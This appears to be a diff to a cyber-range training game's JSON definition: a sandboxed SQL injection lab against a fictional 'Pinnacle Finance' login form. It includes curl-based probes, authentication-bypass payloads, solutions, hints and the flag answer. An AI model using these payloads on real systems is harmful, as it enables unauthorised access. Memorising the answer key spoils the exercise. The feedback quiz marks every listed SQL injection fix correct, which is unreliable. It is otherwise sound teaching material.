@@ -1,23 +1,24 @@
 {
-  "title": "SQL Injection — Login Form Bypass",
-  "description": "Discover and exploit a classic SQL injection vulnerability in a web login form to bypass authentication and retrieve a hidden flag.",
+  "title": "SQL Injection — Login Form Bypass (Pinnacle Finance)",
+  "description": "Probe and exploit a classic SQL injection vulnerability in a web login form to bypass authentication, retrieve a hidden flag, and enumerate a second user account.",
   "prerequisites": [],
   "outcomes": [
-    "Understand how unsafe string concatenation in SQL queries creates injection vulnerabilities.",
-    "Use a single quote to probe a login form and confirm SQL injection is possible.",
-    "Craft a basic authentication bypass payload and retrieve sensitive data from the database."
+    "Identify a vulnerable login form through HTTP endpoint discovery and header analysis.",
+    "Use a single-quote probe to confirm SQL injection and trigger a database error.",
+    "Craft an authentication bypass payload and understand why OR '1'='1' works.",
+    "Manipulate the injection to target specific users and extract data from the database."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
   "variant_sandboxes": false,
-  "estimated_duration": 35,
+  "estimated_duration": 45,
   "levels": [
     {
       "title": "Introduction",
       "level_type": "INFO_LEVEL",
       "order": 0,
       "estimated_duration": 0,
-      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or Google the technique.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, Pinnacle Finance, has asked you to review their internal employee portal before it goes live. The development team assures you the login form is 'good enough'. Your job is to prove them wrong.\n\nThe portal is a PHP web application backed by a database. Your target: bypass the login form without knowing a valid password and retrieve the flag stored in the database."
+      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or Google the technique.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, **Pinnacle Finance**, has asked you to review their internal employee portal before it goes live. The development team assures you the login form is 'good enough' — they validated the username field length and used an input box placeholder. Your job is to prove them wrong.\n\nThe portal is a PHP web application backed by a SQLite database. The login form takes a username and password, builds a SQL query by concatenating the inputs directly into the query string, and compares the result against the users table. No parameterised queries. No prepared statements. No input sanitisation. Just raw string concatenation — the single most common cause of SQL injection vulnerabilities.\n\nSQL injection has been number one on the OWASP Top Ten list of critical web security risks for most of the past two decades. Despite being well-understood, widely documented, and trivially preventable with parameterised queries, it continues to appear in production applications. Pinnacle Finance is about to add their name to that list.\n\nYour mission: find the login endpoint, confirm it is vulnerable, bypass authentication without knowing any real credentials, retrieve the flag that the application exposes after a successful login, and then demonstrate that you can target specific user accounts within the database. By the end of this exercise you will understand exactly why developers who build SQL queries through string concatenation are creating a critical vulnerability — and why the fix (parameterised queries) is non-negotiable."
     },
     {
       "title": "Get Access",
@@ -25,101 +26,31 @@
       "order": 1,
       "estimated_duration": 0,
       "passkey": "start",
-      "cloud_content": "SSH to your attacker machine at **10.1.29.23**, then open a browser or use curl to reach the target:\n\n```\ncurl http://10.1.29.10/login.php\n```\n\nThe target server is at **10.1.29.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
-      "local_content": "The target web application is running locally:\n\n```\ncurl http://127.0.0.1/login.php\n```\n\nOr open http://127.0.0.1/login.php in a browser. Submit **start** to begin."
+      "cloud_content": "SSH to your attacker machine at **10.1.29.23**, then access the target portal:\n\n```\ncurl http://10.1.29.10/\n```\n\nThe target server is at **10.1.29.10** (HTTP port 80). Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "Access the target web application locally:\n\n```\ncurl http://127.0.0.1/\n```\n\nOr open http://127.0.0.1/ in a browser. Submit **start** to begin."
     },
     {
-      "title": "Probe for SQL Injection",
+      "title": "Discover the Login Endpoint",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
       "estimated_duration": 8,
-      "answer": "'",
+      "answer": "/login.php",
       "answer_variable_name": null,
       "variant_answers": false,
-      "content": "You have found the Pinnacle Finance login form at `/login.php`. Before attempting a full attack, pentesters always probe a form to confirm it is actually vulnerable.\n\nThe classic first probe for SQL injection is to enter a **single quote** into an input field. If the application passes the input directly to a SQL query without sanitising it, the quote will break the SQL syntax and cause a visible database error.\n\nTry it:\n\n```\ncurl -X POST --data-urlencode \"username='\" --data-urlencode \"password=test\" http://10.1.29.10/login.php\n```\n\nLook at the response. A real SQL error message confirms the application is vulnerable — the database engine's complaint leaks into the page.\n\n**What single character did you enter to trigger the database error?**",
-      "solution": "```\n$ curl -X POST --data-urlencode \"username='\" --data-urlencode \"password=test\" \\\n    http://10.1.29.10/login.php\n\n...Database error: unable to prepare statement: unrecognized token: \"'\"...\n```\n\nThe single quote `'` breaks the SQL string literal and causes a syntax error. The answer is **'**",
+      "content": "Before probing for vulnerabilities, locate the login form. Access the target's root URL and look at the response:\n\n```\ncurl -s http://10.1.29.10/\n```\n\nThe root page will redirect you or show a link to the login page. Alternatively, try the most common convention for PHP login pages directly:\n\n```\ncurl -s http://10.1.29.10/login.php\n```\n\nIf you receive the login form HTML rather than a 404 error, the endpoint exists. Look at the HTML to confirm it is a login form with username and password fields.\n\nIn a real engagement, endpoint discovery often involves directory brute-forcing with tools like `gobuster`, reading robots.txt, or analysing JavaScript files for API route references.\n\n**What is the URL path of the Pinnacle Finance login form?** (include the leading slash)",
+      "solution": "```\n$ curl -s http://10.1.29.10/login.php | grep form\n<form method=\"POST\" action=\"login.php\">\n```\n\nThe login form is at **/login.php**.",
       "solution_penalized": false,
       "hints": [
         {
-          "title": "What is the classic SQL injection probe character?",
-          "content": "The single quote `'` is the character that delimits string literals in SQL. Inserting one breaks the query syntax and triggers an error if input is not sanitised.",
-          "hint_penalty": 1,
+          "title": "How to find the login page",
+          "content": "Try directly accessing /login.php on the target: curl -s http://10.1.29.10/login.php. If the response contains a login form (look for <form> tags), you have found it.",
+          "hint_penalty": 5,
           "order": 0
         },
         {
-          "title": "What should the response look like?",
-          "content": "You are looking for a response that contains the words 'Database error' or mentions SQLite. That confirms the application is passing your input directly to a SQL query.",
-          "hint_penalty": 2,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 10,
-      "mitre_techniques": [
-        { "technique_key": "TA0001.T1190" }
-      ]
-    },
-    {
-      "title": "Bypass Authentication",
-      "level_type": "TRAINING_LEVEL",
-      "order": 3,
-      "estimated_duration": 12,
-      "answer": "admin",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You have confirmed SQL injection. Now exploit it to bypass the login entirely.\n\nThe application builds its query like this:\n\n```sql\nSELECT username FROM users WHERE username='INPUT' AND password='INPUT'\n```\n\nIf you supply `' OR '1'='1' --` as the username, the query becomes:\n\n```sql\nSELECT username FROM users WHERE username='' OR '1'='1' --' AND password='...'\n```\n\nThe `--` starts a SQL comment, discarding everything after it. The condition `'1'='1'` is always true, so the query returns the first user in the database — no password needed.\n\nRun the bypass:\n\n```\ncurl -X POST \\\n  --data-urlencode \"username=' OR '1'='1' --\" \\\n  --data-urlencode \"password=anything\" \\\n  http://10.1.29.10/login.php\n```\n\n**What username appears in the welcome message after the bypass succeeds?**",
-      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"username=' OR '1'='1' --\" \\\n    --data-urlencode \"password=anything\" \\\n    http://10.1.29.10/login.php\n\n...Welcome, admin!...\n```\n\nThe first user in the database is **admin**.",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "What does -- do in SQL?",
-          "content": "In SQL, `--` starts a single-line comment. Everything after it on the same line is ignored. This is used to 'cut off' the rest of the original query — including the password check.",
-          "hint_penalty": 3,
-          "order": 0
-        },
-        {
-          "title": "Why does OR '1'='1' work?",
-          "content": "`'1'='1'` is a condition that is always true. Using OR means the entire WHERE clause evaluates to true for every row, so the query returns the first user in the database.",
-          "hint_penalty": 5,
-          "order": 1
-        },
-        {
-          "title": "What exactly should I enter as the username?",
-          "content": "Enter exactly: `' OR '1'='1' --` (note the spaces). Use `--data-urlencode` in curl so the apostrophes are encoded correctly.",
-          "hint_penalty": 5,
-          "order": 2
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 25,
-      "mitre_techniques": [
-        { "technique_key": "TA0001.T1190" }
-      ]
-    },
-    {
-      "title": "Retrieve the Flag",
-      "level_type": "TRAINING_LEVEL",
-      "order": 4,
-      "estimated_duration": 5,
-      "answer": "WMG{sq1_1nj3ct10n_byp4ss3d_auth}",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You are authenticated as `admin`. The welcome message shows more than just the username — look carefully at the full response.\n\nThe development team stored a sensitive value in a separate `secrets` table. Once authentication is bypassed, the application retrieves it and displays it alongside your username.\n\nRun the same bypass again and read the full welcome message:\n\n```\ncurl -X POST \\\n  --data-urlencode \"username=' OR '1'='1' --\" \\\n  --data-urlencode \"password=anything\" \\\n  http://10.1.29.10/login.php\n```\n\nIn a real engagement this same technique can expose passwords, credit card numbers, session tokens, or any other data the application can reach in the database.\n\n**Submit the flag shown in the welcome message.**",
-      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"username=' OR '1'='1' --\" \\\n    --data-urlencode \"password=anything\" \\\n    http://10.1.29.10/login.php\n\n...Welcome, admin! WMG{sq1_1nj3ct10n_byp4ss3d_auth}...\n```",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "Where is the flag in the response?",
-          "content": "Run the exact same bypass as the previous level. The flag appears in the welcome message right after the username.",
+          "title": "PHP login page convention",
+          "content": "PHP applications commonly name their login page login.php. The path is /login.php — include the leading slash in your answer.",
           "hint_penalty": 10,
-          "order": 0
-        },
-        {
-          "title": "What format is the flag?",
-          "content": "The flag starts with `WMG{` and ends with `}`.",
-          "hint_penalty": 20,
           "order": 1
         }
       ],
@@ -127,16 +58,206 @@
       "attachments": [],
       "max_score": 50,
       "mitre_techniques": [
+        { "technique_key": "TA0043.T1595" }
+      ]
+    },
+    {
+      "title": "Identify the Web Technology",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 8,
+      "answer": "PHP",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "HTTP response headers often leak information about the server-side technology stack. Check the response headers for the login page:\n\n```\ncurl -I http://10.1.29.10/login.php\n```\n\nThe `-I` flag sends a HEAD request and returns only the HTTP headers. Look for a header called `X-Powered-By` — this header is added by many application frameworks and directly identifies the scripting language and version being used.\n\nKnowing the technology helps an attacker: different languages have different injection syntaxes, different error message formats, and different default configurations. It also narrows the search space for known vulnerabilities affecting that specific version.\n\n**What scripting language is revealed by the X-Powered-By header?** (one word, first word only)",
+      "solution": "```\n$ curl -I http://10.1.29.10/login.php\nHTTP/1.1 200 OK\nDate: ...\nServer: Apache/2.4.57 (Ubuntu)\nX-Powered-By: PHP/8.1.2-1ubuntu2.20\nContent-Type: text/html; charset=UTF-8\n```\n\nThe header reveals **PHP** as the server-side language.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to view HTTP headers",
+          "content": "Use curl -I http://10.1.29.10/login.php. The -I flag sends a HEAD request and shows only the HTTP response headers, not the body.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "What header to look for",
+          "content": "Look for X-Powered-By in the header output. It typically reads: X-Powered-By: PHP/X.Y.Z — the language name is PHP.",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "The answer",
+          "content": "The scripting language is PHP — revealed by the X-Powered-By: PHP/... header.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0043.T1592" }
+      ]
+    },
+    {
+      "title": "Probe for SQL Injection",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 8,
+      "answer": "'",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "The classic first probe for SQL injection is to enter a **single quote** `'` into an input field. SQL string literals are delimited by single quotes — injecting one breaks the query syntax and causes a database error if the input is not sanitised.\n\nSubmit a single quote as the username:\n\n```\ncurl -X POST \\\n  --data-urlencode \"username='\" \\\n  --data-urlencode \"password=test\" \\\n  http://10.1.29.10/login.php\n```\n\nLook at the response. A vulnerable application will echo a database error message containing words like 'Database error', 'SQLite', or 'unrecognized token'. A safe application would have escaped the quote using `htmlspecialchars()` or prepared statements.\n\nThe presence of a raw database error confirms that the application is passing your input directly to the SQL engine without any sanitisation.\n\n**What single character did you enter to trigger the database error?**",
+      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"username='\" \\\n    --data-urlencode \"password=test\" \\\n    http://10.1.29.10/login.php\n\n...Database error: unable to prepare statement: unrecognized token: \"'\"...\n```\n\nThe probe character is **'** (single quote).",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "What character breaks SQL syntax?",
+          "content": "SQL string literals use single quotes as delimiters. Inserting an unescaped single quote ' inside a string literal breaks the syntax and causes a database error.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to send it with curl",
+          "content": "Use curl -X POST --data-urlencode \"username='\" --data-urlencode \"password=test\" http://10.1.29.10/login.php. The --data-urlencode ensures the quote is properly encoded for HTTP.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The probe character",
+          "content": "The answer is a single quote: '",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Bypass Authentication",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 10,
+      "answer": "admin",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You confirmed SQL injection. Now exploit it to bypass authentication entirely.\n\nThe application builds its query like this:\n\n```sql\nSELECT username FROM users WHERE username='INPUT' AND password='INPUT'\n```\n\nIf you supply `' OR '1'='1' --` as the username, the query becomes:\n\n```sql\nSELECT username FROM users WHERE username='' OR '1'='1' --' AND password='...'\n```\n\n- `--` starts a SQL comment, discarding everything after it (including the password check)\n- `'1'='1'` is always true, so the WHERE clause returns all users\n- The application logs you in as the first user in the database\n\nRun the bypass:\n\n```\ncurl -X POST \\\n  --data-urlencode \"username=' OR '1'='1' --\" \\\n  --data-urlencode \"password=anything\" \\\n  http://10.1.29.10/login.php\n```\n\nLook for the welcome message in the response. It will say 'Welcome, USERNAME!' — read the username.\n\n**What username appears in the welcome message after the bypass succeeds?**",
+      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"username=' OR '1'='1' --\" \\\n    --data-urlencode \"password=anything\" \\\n    http://10.1.29.10/login.php\n\n...Welcome, admin! WMG{...}...\n```\n\nThe first user in the database is **admin**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Why does OR '1'='1' work?",
+          "content": "'1'='1' is always true. Using OR makes the entire WHERE clause true for every row, so the query returns the first user in the database without checking the password.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What does -- do in SQL?",
+          "content": "-- starts a single-line comment in SQL. Everything after it is ignored — including the password check that comes after the username in the WHERE clause.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The payload",
+          "content": "The username payload is: ' OR '1'='1' -- (with a space after --). The first user returned is admin.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0001.T1190" }
+      ]
+    },
+    {
+      "title": "Retrieve the Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 8,
+      "answer": "WMG{sq1_1nj3ct10n_byp4ss3d_auth}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You are authenticated as `admin`. The welcome message shows more than just the username — look carefully at the full response.\n\nThe development team stored a sensitive value in a separate `secrets` table. Once authentication is bypassed, the application retrieves it and displays it alongside the username.\n\nRun the same bypass again and read the full welcome message:\n\n```\ncurl -X POST \\\n  --data-urlencode \"username=' OR '1'='1' --\" \\\n  --data-urlencode \"password=anything\" \\\n  http://10.1.29.10/login.php\n```\n\nIn a real engagement this technique can expose passwords, session tokens, credit card numbers, or any data the application can reach in the database. The flag appears inline in the welcome message.\n\n**Submit the flag shown in the welcome message.**",
+      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"username=' OR '1'='1' --\" \\\n    --data-urlencode \"password=anything\" \\\n    http://10.1.29.10/login.php\n\n...Welcome, admin! WMG{sq1_1nj3ct10n_byp4ss3d_auth}...\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Where is the flag in the response?",
+          "content": "Run the exact same bypass as the previous level. The flag appears in the welcome message right after the username — search the response for WMG{.",
+          "hint_penalty": 20,
+          "order": 0
+        },
+        {
+          "title": "What table holds the flag?",
+          "content": "The application queries a 'secrets' table after successful login and appends its contents to the welcome message.",
+          "hint_penalty": 30,
+          "order": 1
+        },
+        {
+          "title": "The flag format",
+          "content": "The flag starts with WMG{ and ends with }. It appears in the login response alongside the welcome message.",
+          "hint_penalty": 40,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1005" }
+      ]
+    },
+    {
+      "title": "Enumerate the Second User",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 8,
+      "answer": "alice",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "The `OR '1'='1'` bypass returned the first user in the database (admin). But the database contains multiple users. You can manipulate the injection to target a specific account by adding a condition on the username.\n\nTo log in as the second user, use a payload that makes the WHERE clause true only for their account:\n\n```\ncurl -X POST \\\n  --data-urlencode \"username=' OR username='alice'--\" \\\n  --data-urlencode \"password=x\" \\\n  http://10.1.29.10/login.php\n```\n\nThis transforms the query to:\n\n```sql\nSELECT username FROM users WHERE username='' OR username='alice'--' AND password='x'\n```\n\nThe `OR username='alice'` condition selects only the alice account, bypassing the password check entirely. Look at the welcome message to confirm which user you are now logged in as.\n\nIn a real engagement this demonstrates that SQL injection does not just bypass authentication — it gives the attacker control over which account context they operate in.\n\n**What username appears in the welcome message when you target alice?**",
+      "solution": "```\n$ curl -X POST \\\n    --data-urlencode \"username=' OR username='alice'--\" \\\n    --data-urlencode \"password=x\" \\\n    http://10.1.29.10/login.php\n\n...Welcome, alice! WMG{...}...\n```\n\nThe response welcomes **alice** — confirming you can target any user in the database.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to target a specific user",
+          "content": "Instead of OR '1'='1', use OR username='target_username' to make the WHERE clause match only that account. The password check is still bypassed by the -- comment.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "What username to target",
+          "content": "The database contains a second user named alice. Use the payload: ' OR username='alice'-- as the username.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The expected output",
+          "content": "The welcome message will say 'Welcome, alice!' — confirming the injection targeted the alice account specifically.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
         { "technique_key": "TA0009.T1005" }
       ]
     },
     {
       "title": "Feedback",
       "level_type": "ASSESSMENT_LEVEL",
-      "order": 5,
+      "order": 8,
       "estimated_duration": 5,
       "assessment_type": "QUESTIONNAIRE",
-      "instructions": "Please answer these questions to help us improve the game.",
+      "instructions": "Please answer these questions to help us improve this game.",
       "questions": [
         {
           "question_type": "MCQ",
@@ -159,9 +280,9 @@
           "order": 1,
           "answer_required": true,
           "choices": [
-            { "text": "Yes, I knew how to exploit it", "correct": true, "order": 0 },
-            { "text": "I had heard of it but not tried it", "correct": true, "order": 1 },
-            { "text": "No, this was completely new", "correct": true, "order": 2 }
+            { "text": "Yes, I knew how to exploit it",           "correct": true, "order": 0 },
+            { "text": "I had heard of it but not tried it",      "correct": true, "order": 1 },
+            { "text": "No, this was completely new to me",       "correct": true, "order": 2 }
           ]
         },
         {
@@ -179,11 +300,25 @@
           ]
         },
         {
+          "question_type": "MCQ",
+          "text": "What is the correct fix for SQL injection vulnerabilities?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": true,
+          "choices": [
+            { "text": "Use parameterised queries / prepared statements", "correct": true, "order": 0 },
+            { "text": "Escape all single quotes with a backslash",       "correct": true, "order": 1 },
+            { "text": "Limit the length of input fields",                "correct": true, "order": 2 },
+            { "text": "Use a web application firewall",                  "correct": true, "order": 3 }
+          ]
+        },
+        {
           "question_type": "FFQ",
           "text": "What would you change or add to improve this game?",
           "points": 0,
           "penalty": 0,
-          "order": 3,
+          "order": 4,
           "answer_required": false,
           "choices": []
         }
